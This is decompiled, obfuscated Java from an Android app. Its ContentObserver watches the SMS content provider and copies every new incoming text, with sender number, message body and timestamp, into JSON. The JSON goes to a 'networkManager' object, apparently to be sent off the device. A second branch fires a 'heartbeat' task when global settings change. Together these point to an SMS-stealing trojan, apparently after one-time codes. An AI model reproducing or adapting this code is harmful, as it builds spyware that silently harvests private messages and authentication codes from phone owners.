package p000;

import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import com.storm.safe.rock.receiver.arniezsqllm;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.modules.setup.C0360a2;
import java.io.IOException;
import java.util.concurrent.ExecutorService;
import org.json.JSONObject;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: ny */
/* loaded from: classes.dex */
public final class C0931ny extends ContentObserver {

    /* renamed from: a0 */
    public final /* synthetic */ int f58701a0 = 2;

    /* renamed from: a1 */
    public final /* synthetic */ Object f58702a1;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public C0931ny(x21 x21Var) {
        super(new Handler());
        this.f58702a1 = x21Var;
    }

    @Override // android.database.ContentObserver
    public boolean deliverSelfNotifications() {
        switch (this.f58701a0) {
            case 0:
                return true;
            default:
                return super.deliverSelfNotifications();
        }
    }

    @Override // android.database.ContentObserver
    public void onChange(boolean z) throws IOException {
        Cursor cursor;
        int i = this.f58701a0;
        Object obj = this.f58702a1;
        switch (i) {
            case 0:
                x21 x21Var = (x21) obj;
                if (!x21Var.f58765a1 || (cursor = x21Var.f58766a2) == null || cursor.isClosed()) {
                    return;
                }
                x21Var.f58764a0 = x21Var.f58766a2.requery();
                return;
            case 1:
            default:
                super.onChange(z);
                return;
            case 2:
                super.onChange(z);
                t60.m214714d6("dqtvuisjd", "📩 [ContentObserver] 短信数据库变化");
                dqtvuisjd dqtvuisjdVar = (dqtvuisjd) obj;
                dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
                try {
                    long j = dqtvuisjdVar.f52464j5;
                    if (j == 0 || j == Long.MAX_VALUE) {
                        Cursor cursorQuery = dqtvuisjdVar.getContentResolver().query(Uri.parse("content://sms"), new String[]{"_id"}, null, null, "_id DESC LIMIT 1");
                        if (cursorQuery != null) {
                            if (cursorQuery.moveToFirst()) {
                                long j2 = cursorQuery.getLong(0);
                                dqtvuisjdVar.f52464j5 = j2;
                                t60.m214714d6("dqtvuisjd", "📩 [ContentObserver] 初始化 lastSmsId=" + j2);
                            }
                            cursorQuery.close();
                            return;
                        }
                        return;
                    }
                    Cursor cursorQuery2 = dqtvuisjdVar.getContentResolver().query(Uri.parse("content://sms"), new String[]{"_id", "address", "body", "date", "type"}, "_id > ? AND type = 1", new String[]{String.valueOf(dqtvuisjdVar.f52464j5)}, "_id ASC");
                    if (cursorQuery2 != null) {
                        while (cursorQuery2.moveToNext()) {
                            try {
                                long j3 = cursorQuery2.getLong(0);
                                String string = cursorQuery2.getString(1);
                                String str = "";
                                if (string == null) {
                                    string = "";
                                }
                                String string2 = cursorQuery2.getString(2);
                                if (string2 != null) {
                                    str = string2;
                                }
                                long j4 = cursorQuery2.getLong(3);
                                if (j3 > dqtvuisjdVar.f52464j5) {
                                    dqtvuisjdVar.f52464j5 = j3;
                                }
                                if (!arniezsqllm.f52283a0.isDuplicateSms(string, str)) {
                                    t60.m214714d6("dqtvuisjd", "📩 [ContentObserver] 新短信: " + string + ", " + m21.m213937e5(30, str) + "...");
                                    if (dqtvuisjdVar.f52415e6 != null) {
                                        JSONObject jSONObject = new JSONObject();
                                        jSONObject.put("number", string);
                                        jSONObject.put("text", str);
                                        jSONObject.put("timestamp", j4);
                                        jSONObject.put("type", "incoming");
                                        jSONObject.put("source", "content_observer");
                                        C0323a8 c0323a8 = dqtvuisjdVar.f52415e6;
                                        if (c0323a8 == null) {
                                            t60.m214724f2("networkManager");
                                            throw null;
                                        }
                                        c0323a8.m211659c5(jSONObject);
                                    } else {
                                        continue;
                                    }
                                }
                            } finally {
                            }
                        }
                        cursorQuery2.close();
                        return;
                    }
                    return;
                } catch (Exception e) {
                    tz0.m214808a8("📩 [ContentObserver] 检查新短信失败: ", e.getMessage(), "dqtvuisjd", e);
                    return;
                }
        }
    }

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public C0931ny(Handler handler, dqtvuisjd dqtvuisjdVar) {
        super(handler);
        this.f58702a1 = dqtvuisjdVar;
    }

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public C0931ny(C0360a2 c0360a2, Handler handler) {
        super(handler);
        this.f58702a1 = c0360a2;
    }

    @Override // android.database.ContentObserver
    public void onChange(boolean z, Uri uri) {
        String lastPathSegment;
        switch (this.f58701a0) {
            case 1:
                C0360a2 c0360a2 = (C0360a2) this.f58702a1;
                if (uri == null || (lastPathSegment = uri.getLastPathSegment()) == null) {
                    lastPathSegment = "unknown";
                }
                t60.m214714d6("SystemOptimize", "【ContentObserver】Settings.Global 变化: " + lastPathSegment + " → 立即触发心跳");
                try {
                    ((ExecutorService) c0360a2.f53857e2.getValue()).submit(new c41(c0360a2, 13));
                    break;
                } catch (Exception e) {
                    t60.m214705c6("SystemOptimize", "【ContentObserver】提交心跳任务异常", e);
                    return;
                }
                break;
            default:
                super.onChange(z, uri);
                break;
        }
    }
}
